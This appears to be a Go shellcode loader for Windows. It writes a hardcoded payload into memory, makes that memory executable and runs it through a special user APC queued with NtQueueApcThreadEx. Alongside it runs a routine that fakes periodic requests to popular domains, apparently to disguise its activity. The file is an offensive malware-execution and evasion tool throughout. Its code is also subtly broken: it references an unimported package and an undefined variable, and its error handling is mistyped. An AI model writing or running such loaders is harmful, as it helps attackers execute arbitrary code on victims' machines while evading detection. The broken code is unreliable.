package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT   = 0x1000
	MEM_RESERVE  = 0x2000
	PAGE_EXECUTE = 0x20
	PAGE_READWRITE = 0x04
)

const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLAGS_MAX_VALUE
)

func main() {
	var verbose = flag.Bool("verbose", false, "Enable verbose output")
	var debug = flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	var shellcode = []byte{0x33, 0xc0, 0x50, 0xb8, 0x2e, 0x64, 0x6c, 0x6c, 0x50, 0xb8, 0x65, 0x6c, 0x33, 0x32, 0x50, 0xb8, 0x6b, 0x65, 0x72, 0x6e, 0x50, 0x8b, 0xc4, 0x50, 0xb8, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd0, 0x33, 0xc0, 0x50, 0xb8, 0x2e, 0x65, 0x78, 0x65, 0x50, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x50, 0x8b, 0xc4, 0x6a, 0x05, 0x50, 0xb8, 0xad, 0x23, 0x86, 0x7c, 0xff, 0xd0, 0x33, 0xc0, 0x50, 0xb8, 0xfa, 0xca, 0x81, 0x7c, 0xff, 0xd0}

	go periodicNetworkRequests()

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}
	var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	var ntdll = windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
	}
	var VirtualAlloc = kernel32.NewProc("VirtualAlloc")
	var VirtualProtect = kernel32.NewProc("VirtualProtect")
	var GetCurrentThread = kernel32.NewProc("GetCurrentThread")
	var RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
	var NtQueueApcThreadEx = ntdll.NewProc("NtQueueApcThreadEx")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
	}
	var addr, _, errVirtualAlloc uintptr = VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc!= nil && errVirtualAlloc.Error()!= "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
	}
	var _, _, errRtlCopyMemory uintptr = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory!= nil && errRtlCopyMemory.Error()!= "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
	}
	var oldProtect = PAGE_READWRITE
	var _, _, errVirtualProtect uintptr = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect!= nil && errVirtualProtect.Error()!= "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling GetCurrentThread...")
	}
	var thread, _, err uintptr = GetCurrentThread.Call()
	if err.Error()!= "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
	}
	if *verbose {
		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
	}

	if *debug {
		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
	}
	var _, _, e uintptr = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	if e.Error()!= "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", e))
	}
	if *verbose {
		fmt.Println("[-]Queued special user APC")
	}

	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}
}

func periodicNetworkRequests() {
	defer func() { <-done }()
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		rand.Seed(time.Now().UnixNano())
	domains := getRandomAlexaDomains(3)
		wg := &sync.WaitGroup{}
		wg.Add(len(domains))

		for _, domain := range domains {
			go func(d string) {
				defer wg.Done()
				// Simulate network request
				time.Sleep(time.Duration(rand.Intn(time.Second)))
			}(domain)
		}

		wg.Wait()
	}
}

func getRandomAlexaDomains(count int) []string {
	// Placeholder for actual Alexa Top 100 domains
	alexaDomains := []string{"google.com", "facebook.com", "youtube.com", "amazon.com", "wikipedia.org", "wechat.com", "tencent.com", "baidu.com", "qq.com", "yahoo.com"}
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(alexaDomains), func(i, j int) {
		alexaDomains[i], alexaDomains[j] = alexaDomains[j], alexaDomains[i]
	})
	return alexaDomains[:count]
}